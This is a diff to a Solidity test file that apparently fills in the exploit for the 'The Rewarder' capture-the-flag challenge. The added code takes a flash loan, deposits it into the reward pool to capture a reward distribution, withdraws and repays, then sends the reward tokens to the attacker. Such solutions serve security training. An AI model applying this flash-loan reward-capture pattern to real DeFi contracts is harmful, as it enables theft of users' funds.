@@ -84,11 +84,24 @@ contract TheRewarder is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    function receiveFlashLoan(uint256 amount) public {
+        dvt.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+        theRewarderPool.distributeRewards();
+        theRewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanerPool), amount);
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+        vm.warp(block.timestamp + 5 days); // 5 days
+        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
 
+        theRewarderPool.rewardToken().transfer(
+            address(attacker), theRewarderPool.rewardToken().balanceOf(address(this))
+        );
         /**
          * EXPLOIT END *
          */
